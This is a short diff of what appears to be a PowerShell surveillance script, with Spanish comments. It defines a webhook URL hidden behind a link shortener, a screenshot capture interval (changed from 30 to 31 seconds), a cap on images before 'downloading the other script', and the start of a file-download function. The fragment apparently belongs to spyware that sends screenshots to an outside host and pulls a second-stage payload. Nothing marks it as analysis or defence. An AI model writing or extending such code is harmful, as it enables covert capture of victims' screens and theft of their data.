@@ -1,5 +1,5 @@
 $hookurl = "https://bit.ly/chu_kbras"
-$seconds = 30 # Intervalo entre capturas
+$seconds = 31 # Intervalo entre capturas
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Función para descargar un archivo desde una URL
